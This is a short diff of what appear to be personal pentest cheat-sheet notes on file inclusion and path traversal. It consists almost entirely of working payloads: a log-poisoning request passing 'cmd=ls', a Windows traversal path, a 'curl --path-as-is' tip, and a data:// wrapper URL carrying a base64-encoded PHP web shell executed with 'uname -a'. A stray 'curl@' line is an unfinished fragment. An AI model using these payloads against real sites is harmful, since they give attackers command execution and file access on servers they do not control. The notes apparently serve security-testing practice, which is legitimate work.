@@ -8,11 +8,11 @@ PHP Payload
 # Send request to index.php
 ../../../logs.log&cmd=ls
 # will pass the cmd command to poisoned log.
-
+/usr/share/webshells/ have a lot of payloads on kali
 
 Path traversal on Windows OS
 /../../../../../../../../users/install.txt
-curl --path-as-is # help to not get trouble with 
+curl --path-as-is # help to not get trouble
 
 curl@
 index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a
